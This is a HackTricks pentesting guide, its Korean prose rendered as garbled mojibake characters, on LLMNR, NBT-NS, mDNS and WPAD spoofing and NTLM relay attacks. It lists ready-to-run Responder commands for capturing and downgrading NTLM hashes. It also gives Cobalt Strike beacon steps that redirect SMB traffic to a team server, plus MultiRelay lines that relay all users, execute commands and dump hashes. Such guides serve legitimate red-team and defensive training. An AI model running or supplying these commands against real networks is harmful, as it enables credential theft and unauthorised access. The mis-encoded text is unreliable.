# LLMNR, NBT-NS, mDNS/DNS ë° WPAD ìŠ¤í‘¸í•‘ ë° ë¦´ë ˆì´ ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œ

### ë¡œì»¬ í˜¸ìŠ¤íŠ¸ í•´ê²° í”„ë¡œí† ì½œ
- **LLMNR, NBT-NS ë° mDNS**:
- Microsoft ë° ê¸°íƒ€ ìš´ì˜ ì²´ì œëŠ” DNSê°€ ì‹¤íŒ¨í•  ë•Œ ë¡œì»¬ ì´ë¦„ í•´ê²°ì„ ìœ„í•´ LLMNR ë° NBT-NSë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ Apple ë° Linux ì‹œìŠ¤í…œì€ mDNSë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
- ì´ëŸ¬í•œ í”„ë¡œí† ì½œì€ UDPë¥¼ í†µí•´ ì¸ì¦ë˜ì§€ ì•Šì€ ë¸Œë¡œë“œìºìŠ¤íŠ¸ ë°©ì‹ìœ¼ë¡œ í†µì‹ í•˜ê¸° ë•Œë¬¸ì— ê°€ë¡œì±„ê¸°ì™€ ìŠ¤í‘¸í•‘ì— ì·¨ì•½í•©ë‹ˆë‹¤.
- [Responder](https://github.com/lgandx/Responder)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ í”„ë¡œí† ì½œì„ ì¿¼ë¦¬í•˜ëŠ” í˜¸ìŠ¤íŠ¸ì— ìœ„ì¡°ëœ ì‘ë‹µì„ ë³´ë‚´ ì„œë¹„ìŠ¤ë¥¼ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Responderë¥¼ ì‚¬ìš©í•œ ì„œë¹„ìŠ¤ ìœ„ì¥ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì›¹ í”„ë¡ì‹œ ìë™ ê²€ìƒ‰ í”„ë¡œí† ì½œ (WPAD)
- WPADë¥¼ ì‚¬ìš©í•˜ë©´ ë¸Œë¼ìš°ì €ê°€ í”„ë¡ì‹œ ì„¤ì •ì„ ìë™ìœ¼ë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ê²€ìƒ‰ì€ DHCP, DNS ë˜ëŠ” DNSê°€ ì‹¤íŒ¨í•˜ëŠ” ê²½ìš° LLMNR ë° NBT-NSë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤.
- Responderë¥¼ ì‚¬ìš©í•˜ì—¬ WPAD ê³µê²©ì„ ìë™í™”í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì•…ì„± WPAD ì„œë²„ë¡œ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í”„ë¡œí† ì½œ ë…ì ì„ ìœ„í•œ Responder
- **Responder**ëŠ” LLMNR, NBT-NS ë° mDNS ì¿¼ë¦¬ë¥¼ ë…ì í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë„êµ¬ë¡œ, ì¿¼ë¦¬ ìœ í˜•ì— ë”°ë¼ ì„ íƒì ìœ¼ë¡œ ì‘ë‹µì„ ë³´ë‚´ SMB ì„œë¹„ìŠ¤ë¥¼ ì£¼ë¡œ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤.
- Kali Linuxì— ë¯¸ë¦¬ ì„¤ì¹˜ë˜ì–´ ìˆìœ¼ë©° `/etc/responder/Responder.conf`ì—ì„œ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ResponderëŠ” ìº¡ì²˜ëœ í•´ì‹œë¥¼ í™”ë©´ì— í‘œì‹œí•˜ê³  `/usr/share/responder/logs` ë””ë ‰í† ë¦¬ì— ì €ì¥í•©ë‹ˆë‹¤.
- IPv4 ë° IPv6ë¥¼ ëª¨ë‘ ì§€ì›í•©ë‹ˆë‹¤.
- Responderì˜ Windows ë²„ì „ì€ [ì—¬ê¸°](https://github.com/lgandx/Responder-Windows)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Responder ì‹¤í–‰
- ê¸°ë³¸ ì„¤ì •ìœ¼ë¡œ Responder ì‹¤í–‰: `responder -I <ì¸í„°í˜ì´ìŠ¤>`
- ë” ê³µê²©ì ì¸ í”„ë¡œë¹™ì„ ìœ„í•œ ì‹¤í–‰ (ë¶€ì‘ìš© ê°€ëŠ¥): `responder -I <ì¸í„°í˜ì´ìŠ¤> -P -r -v`
- NTLMv1 ë„ì „/ì‘ë‹µì„ ìº¡ì²˜í•˜ì—¬ ë” ì‰¬ìš´ í¬ë˜í‚¹ì„ ìœ„í•œ ê¸°ìˆ : `responder -I <ì¸í„°í˜ì´ìŠ¤> --lm --disable-ess`
- WPAD ìœ„ì¥ì„ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `responder -I <ì¸í„°í˜ì´ìŠ¤> --wpad`
- NetBIOS ìš”ì²­ì„ ê³µê²©ìì˜ IPë¡œ í•´ê²°í•˜ê³  ì¸ì¦ í”„ë¡ì‹œë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `responder.py -I <ì¸í„°í˜ì´ìŠ¤> -Pv`

### Responderë¥¼ ì‚¬ìš©í•œ DHCP ë…ì 
- DHCP ì‘ë‹µì„ ìœ„ì¡°í•˜ì—¬ í”¼í•´ìì˜ ë¼ìš°íŒ… ì •ë³´ë¥¼ ì˜êµ¬ì ìœ¼ë¡œ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©°, ARP ë…ì ì— ë¹„í•´ ì€ë°€í•œ ëŒ€ì•ˆì„ ì œê³µí•©ë‹ˆë‹¤.
- ëŒ€ìƒ ë„¤íŠ¸ì›Œí¬ì˜ êµ¬ì„±ì— ëŒ€í•œ ì •í™•í•œ ì§€ì‹ì´ í•„ìš”í•©ë‹ˆë‹¤.
- ê³µê²© ì‹¤í–‰: `./Responder.py -I eth0 -Pdv`
- ì´ ë°©ë²•ì€ íš¨ê³¼ì ìœ¼ë¡œ NTLMv1/2 í•´ì‹œë¥¼ ìº¡ì²˜í•  ìˆ˜ ìˆì§€ë§Œ, ë„¤íŠ¸ì›Œí¬ ì¤‘ë‹¨ì„ í”¼í•˜ê¸° ìœ„í•´ ì£¼ì˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.

### Responderë¥¼ ì‚¬ìš©í•œ ìê²© ìº¡ì²˜
- ResponderëŠ” ìœ„ì—ì„œ ì–¸ê¸‰í•œ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ë¥¼ ìœ„ì¥í•˜ê³ , ì‚¬ìš©ìê°€ ìœ„ì¥ëœ ì„œë¹„ìŠ¤ì— ì¸ì¦ì„ ì‹œë„í•  ë•Œ ìê²© ì¦ëª…(ì¼ë°˜ì ìœ¼ë¡œ NTLMv2 ë„ì „/ì‘ë‹µ)ì„ ìº¡ì²˜í•©ë‹ˆë‹¤.
- ìê²© ì¦ëª… í¬ë˜í‚¹ì„ ìœ„í•´ NetNTLMv1ë¡œ ë‹¤ìš´ê·¸ë ˆì´ë“œí•˜ê±°ë‚˜ ESSë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ì‹œë„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ê¸°ìˆ ì„ ì‚¬ìš©í•  ë•ŒëŠ” í•©ë²•ì ì´ê³  ìœ¤ë¦¬ì ì¸ ë°©ì‹ìœ¼ë¡œ ì§„í–‰í•´ì•¼ í•˜ë©°, ì ì ˆí•œ ê¶Œí•œì„ ë³´ì¥í•˜ê³  ë„¤íŠ¸ì›Œí¬ ë°©í•´ë‚˜ ë¬´ë‹¨ ì ‘ê·¼ì„ í”¼í•´ì•¼ í•©ë‹ˆë‹¤.

## Inveigh

InveighëŠ” Windows ì‹œìŠ¤í…œì„ ìœ„í•´ ì„¤ê³„ëœ íœí…ŒìŠ¤íŠ¸ ë° ë ˆë“œíŒ€ ë„êµ¬ì…ë‹ˆë‹¤. Responderì™€ ìœ ì‚¬í•œ ìŠ¤í‘¸í•‘ ë° ì¤‘ê°„ì ê³µê²© ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” PowerShell ìŠ¤í¬ë¦½íŠ¸ì—ì„œ C# ì´ì§„ íŒŒì¼ë¡œ ì§„í™”í–ˆìœ¼ë©°, ì£¼ìš” ë²„ì „ìœ¼ë¡œ [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)ì™€ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ê°€ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë§¤ê°œë³€ìˆ˜ ë° ì§€ì¹¨ì€ [**ìœ„í‚¤**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

InveighëŠ” PowerShellì„ í†µí•´ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
ë˜ëŠ” C# ì´ì§„ íŒŒì¼ë¡œ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Inveigh.exe
```
### NTLM Relay Attack

ì´ ê³µê²©ì€ SMB ì¸ì¦ ì„¸ì…˜ì„ í™œìš©í•˜ì—¬ ëŒ€ìƒ ì»´í“¨í„°ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ì„±ê³µ ì‹œ ì‹œìŠ¤í…œ ì‰˜ì„ ì–»ìŠµë‹ˆë‹¤. ì£¼ìš” ì „ì œ ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
- ì¸ì¦í•˜ëŠ” ì‚¬ìš©ìëŠ” ì¤‘ê³„ëœ í˜¸ìŠ¤íŠ¸ì—ì„œ ë¡œì»¬ ê´€ë¦¬ì ì•¡ì„¸ìŠ¤ë¥¼ ê°€ì ¸ì•¼ í•©ë‹ˆë‹¤.
- SMB ì„œëª…ì´ ë¹„í™œì„±í™”ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

#### 445 í¬íŠ¸ í¬ì›Œë”© ë° í„°ë„ë§

ì§ì ‘ì ì¸ ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì´ ë¶ˆê°€ëŠ¥í•œ ê²½ìš°, 445 í¬íŠ¸ì˜ íŠ¸ë˜í”½ì„ í¬ì›Œë”©í•˜ê³  í„°ë„ë§í•´ì•¼ í•©ë‹ˆë‹¤. [**PortBender**](https://github.com/praetorian-inc/PortBender)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í¬íŠ¸ 445ì˜ íŠ¸ë˜í”½ì„ ë‹¤ë¥¸ í¬íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ëŠ” ê²ƒì´ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” ë¡œì»¬ ê´€ë¦¬ì ì•¡ì„¸ìŠ¤ê°€ ë“œë¼ì´ë²„ ë¡œë”©ì— ì‚¬ìš© ê°€ëŠ¥í•œ ê²½ìš° í•„ìˆ˜ì ì…ë‹ˆë‹¤.

Cobalt Strikeì—ì„œ PortBender ì„¤ì • ë° ìš´ì˜:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay ê³µê²©ì„ ìœ„í•œ ë‹¤ë¥¸ ë„êµ¬ë“¤

- **Metasploit**: í”„ë¡ì‹œ, ë¡œì»¬ ë° ì›ê²© í˜¸ìŠ¤íŠ¸ ì„¸ë¶€ ì •ë³´ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.
- **smbrelayx**: SMB ì„¸ì…˜ì„ ë¦´ë ˆì´í•˜ê³  ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ë°±ë„ì–´ë¥¼ ë°°í¬í•˜ê¸° ìœ„í•œ Python ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤.
- **MultiRelay**: íŠ¹ì • ì‚¬ìš©ì ë˜ëŠ” ëª¨ë“  ì‚¬ìš©ìì— ëŒ€í•œ ë¦´ë ˆì´, ëª…ë ¹ ì‹¤í–‰ ë˜ëŠ” í•´ì‹œ ë¤í”„ë¥¼ ìœ„í•œ Responder ìŠ¤ìœ„íŠ¸ì˜ ë„êµ¬ì…ë‹ˆë‹¤.

ê° ë„êµ¬ëŠ” í•„ìš”í•œ ê²½ìš° SOCKS í”„ë¡ì‹œë¥¼ í†µí•´ ì‘ë™í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê°„ì ‘ì ì¸ ë„¤íŠ¸ì›Œí¬ ì•¡ì„¸ìŠ¤ë¡œë„ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### MultiRelay ì‘ë™

MultiRelayëŠ” _**/usr/share/responder/tools**_ ë””ë ‰í† ë¦¬ì—ì„œ ì‹¤í–‰ë˜ë©°, íŠ¹ì • IP ë˜ëŠ” ì‚¬ìš©ìë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
ì´ëŸ¬í•œ ë„êµ¬ì™€ ê¸°ìˆ ì€ ë‹¤ì–‘í•œ ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì—ì„œ NTLM Relay ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ í¬ê´„ì ì¸ ì„¸íŠ¸ë¥¼ í˜•ì„±í•©ë‹ˆë‹¤.

### NTLM ë¡œê·¸ì¸ ê°•ì œ

Windowsì—ì„œëŠ” íŠ¹ì • ê¶Œí•œì´ ìˆëŠ” ê³„ì •ì„ ì„ì˜ì˜ ê¸°ê¸°ì— ì¸ì¦í•˜ë„ë¡ **ê°•ì œí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**. ë‹¤ìŒ í˜ì´ì§€ë¥¼ ì½ì–´ë³´ê³  ì´ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ì„¸ìš”:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## ì°¸ê³  ìë£Œ
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
